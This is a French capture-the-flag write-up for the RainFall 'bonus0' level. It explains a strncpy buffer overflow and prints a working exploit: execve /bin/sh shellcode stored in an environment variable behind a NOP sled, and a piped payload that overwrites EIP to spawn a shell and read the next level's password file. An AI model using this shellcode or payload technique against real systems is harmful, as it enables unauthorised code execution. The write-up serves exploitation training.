# Level Bonus0

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
Hello,
 - 
World!
Hello, World!
```

Une fois `bonus0` execute pour tester son comportement on se retrouve avec un programme qui demande a l'utilisateur deux entrees tronquant si elle font plus de `20 caracteres` en utilisant `strncpy` sans garantie d'avoir une chaine de caractere avec le caractere de terminaison `\0`

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAAA
 - 
0123456789BCDEFGHIJKLMNOP
AAAAAAAAAAAAAAAAAAAA0123456789BCDEFGHIJK��� 0123456789BCDEFGHIJK���

Program received signal SIGSEGV, Segmentation fault.
0x44434239 in ?? ()
```

L’ecrasement de `EIP` se produit apres `29 octets` (`20` pour le premier buffer, `9` pour le second) comme le confirment les valeurs `9BCD` observees
En l’absence de fonction appelant un shell l’exploitation repose sur l’injection d’un `shellcode`

Ayant des restrictions sur la taille de nos buffer pour pouvoir placer notre shellcode qui fait plus de `20 caracteres` on va se diriger vers les variables d'environnement

En utilisant le meme payload deja utilise dans les niveaux precedents en s'assurant d'avoir une suite d'instruction `NOP(\x90)` pour ne pas avoir a faire de calcul d'offset precis

```bash
bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
```

Maintenant trouvons son adresse grace a un petit programme pour l'ecrire dans le registre `EIP` dans notre payload

Un decalage arbitraire de `10 octets` est utilise afin de garantir l’atterrissage dans le `NOP sled` evitant un calcul precis de l’adresse

```bash
bonus0@RainFall:~$ cd /tmp/
bonus0@RainFall:/tmp$ gcc getenv.c -o getenv
bonus0@RainFall:/tmp$ ./getenv SHELLCODE
0xbffff8b8
bonus0@RainFall:/tmp$ python 
Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print(hex(0xbffff8b8 + 10))
0xbffff8c2
```

```bash
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 9 + "\xbf\xff\xf8\xc2"[::-1] + "C" * 50'; cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���
whoami
bonus1
cat /home/user/bonus1/.pass
*******************************************
```